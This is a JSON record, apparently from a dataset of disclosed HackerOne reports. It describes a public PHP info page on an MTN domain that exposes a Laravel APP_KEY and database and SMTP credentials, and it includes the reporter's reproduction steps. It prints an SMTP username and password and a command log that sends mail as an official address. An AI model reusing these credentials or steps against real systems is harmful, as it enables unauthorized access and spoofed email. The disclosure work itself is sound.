@@ -1,0 +1,38 @@
+{
+    "reported_to": "MTN Group",
+    "reported_by": "pudsec ",
+    "title": "PHP Info Exposing Secrets at https://radio.mtn.bj/info",
+    "content": "\nSummary:\nDuring recon I discovered a PHP Info file exposing environment variables such as; Laravel APP_KEY, Database username/password, SMTP username/password, etc.\nSteps To Reproduce:\nVisit the following URL;\nCode 25 Bytes\n1https://radio.mtn.bj/info\nYou will be presented with a PHP Info file exposing environment / PHP Variables.\nFurther Information:\nI successfully sent an email using python-smtp-mail-sending-tester with the exposed credentials;\nCode 656 Bytes\n1$ python smtptest.py -v -u eba@gbdesignweb.com -p w?#h#DLkAPa7 no-reply@mtn.bj pudsec@wearehackerone.com camembert.o2switch.net\n2('usetls:', False)\n3('usessl:', False)\n4('from address:', 'no-reply@mtn.bj')\n5('to address:', 'pudsec@wearehackerone.com')\n6('server address:', 'camembert.o2switch.net')\n7('server port:', 25)\n8('smtp username:', 'eba@gbdesignweb.com')\n9smtp password: *****\n10('smtplib debuglevel:', 0)\n11-- Message body ---------------------\n12From: no-reply@mtn.bj\n13To: pudsec@wearehackerone.com\n14Subject: Test Message from smtptest at 2020-12-03 13:02:56\n15\n16Test message from the smtptest tool sent at 2020-12-03 13:02:56\n17-------------------------------------\nThe APP_KEY being exposed can potential be abused as it's primary purpose is for encrypting cookies, creating signatures and encrypting/decrypting values.\nSuggestions:\nNever expose PHP Info\nChange all passwords and APP_KEY\nImpact\nExposing passwords to critical services.\nProviding application keys used for encryption/decryption within the app.\nSending email coming from an official email address.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Information Disclosure"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1646754480,
+    "report_url": "https://hackerone.com/reports/1049402",
+    "vuln_category": "WEB_APP",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "LOW",
+    "steps": [
+        [
+            1,
+            "Visit the URL https://radio.mtn.bj/info to access the PHP Info file."
+        ],
+        [
+            2,
+            "Inspect the exposed environment variables, including Laravel APP_KEY, database credentials, and SMTP credentials."
+        ]
+    ],
+    "vuln_description": "The PHP Info file at https://radio.mtn.bj/info exposes sensitive environment variables, including Laravel APP_KEY, database credentials, and SMTP credentials. This information disclosure could lead to unauthorized access, data breaches, and misuse of the application's functionalities.",
+    "reason": "The vulnerability is straightforward to discover as it involves accessing a publicly available PHP Info file, which clearly lists all environment variables. No complex interactions or manipulations are required.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
